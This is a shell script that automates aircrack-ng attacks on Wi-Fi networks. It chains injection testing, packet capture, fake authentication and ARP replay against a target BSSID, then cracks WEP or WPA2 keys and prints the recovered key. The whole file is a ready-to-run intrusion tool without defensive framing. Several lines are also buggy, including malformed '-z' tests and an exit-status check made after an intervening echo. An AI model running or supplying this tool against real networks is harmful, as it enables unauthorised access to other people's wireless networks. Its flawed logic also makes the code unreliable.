#!/bin/sh

#Arguments : BSSID, source(mac), file Name, interface, attack Type(0-3)(optional)

if [ $1 = '--help' ]
then
	echo "Aircrack-ng auto tool help page"
	echo ""
	echo "usage:"
	echo "crack.sh [BSSID] [source MAC] [File Name] [Interface] [Attack Type(0-3)(optional)] [dictionary file(required only for attack type 3]"
	echo ""
	echo ""
	echo "Attack Types:"
	echo ""
	echo " 0 - PTW Attack"
	echo " 1 - Korak Attack"
	echo " 2 - WEP Dictionary Attack"
	echo " 3 - WPA2 Dictionary Attack"
	echo ""
	echo ""
	echo ""
	echo ""
else

	if [ $1 -z ]
	then
		echo 'Please Enter BSSID'
		read BSSID
	else
		BSSID=$1
	fi
	if [ $2 -z ]
	then
		echo 'Please Enter Source MAC'
		read SMAC
	else
		SMAC=$2
	fi
	if [ $3 -z ]
	then
		echo 'Please Enter a File Name'
		read FNAME
	else
		FNAME=$3
	fi
	if [ $4 -z ]
	then
		echo 'Please Enter Interface to be used (wifi card)'
		read IFACE
		echo
		echo 'please enter attack type (0-3)'
		read AT
	else
		IFACE=$4
	fi
	if [ $5 -z ]
	then
		echo "Please enter the number for the attack type"
		echo " 0 - PTW Attack"
		echo " 1 - Korak Attack"
		echo " 2 - WEP Dictionary Attack"
		echo " 3 - WPA2 Dictionary Attack"
		read AT
	else
		AT=$5
	fi
	
	if [ $5 -eq 3 ] && [ $6 -z ]
	then
		echo "please enter dictionary file location"
		read DICT
	else
		DICT=$6
	fi
		

	clear
	echo 'BSSID: ' $BSSID
	echo 'SMAC: ' $SMAC
	echo 'File Name: ' $FNAME
	echo 'Interface: ' $IFACE
	echo 'attack Type: ' $AT
	
	
	echo
	echo "if info is correct hit enter"
	echo "otherwise press Ctrl + C"
	read throwAway
	
	aireplay-ng -9 -a $BSSID $IFACE
	
	echo $?
	if [ $? -eq 0 ]
	then
		gnome-terminal -- airodump-ng -c 1 --bssid $BSSID -w $FNAME $IFACE
		aireplay-ng -1 0 -a $BSSID -h $SMAC $IFACE
		gnome-terminal -- aireplay-ng -3 -b $BSSID -h $SMAC $IFACE
		echo
		echo "you are free to connect other devices to the network"
		echo
		echo "4b4559204e4f5420464f554e440a">output.txt #hex translates to KEY NOT FOUND
			
		sleep 60
		
		#RELATIVE=$3*
		#echo $RELATIVE
		SUCCESS=0
		
		while [ $SUCCESS -ne 1 ]
		do
			echo "When ready to run the crack hit enter"
			read throwAway
			
			if [ $AT -eq 1 ]
			then
				gnome-terminal -- aircrack-ng -k 1 -l output.txt -b $BSSID $FNAME*.cap
			elif [ $AT -eq 2 ]
			then
				#force attack mode (static wep)
				gnome-terminal -- aircrack-ng -a 1 -l output.txt -b $BSSID $FNAME*.cap
			elif [ $AT -eq 3 ]
			then
				aircrack-ng -a 2 -l output.txt -w $DICT -b $BSSID $FNAME*
			else
				gnome-terminal -- aircrack-ng -l output.txt -b $BSSID $FNAME*.cap
			fi
			
			sleep 5
			
			echo
			echo 'Key:'
			cat output.txt | xxd -r -p > $FNAME.txt
			cat $FNAME.txt
			echo
			echo "Was the crack sucessful? yes=1 no=0: "
			read SUCCESS
		done
		rm output.txt
		echo
	fi
fi
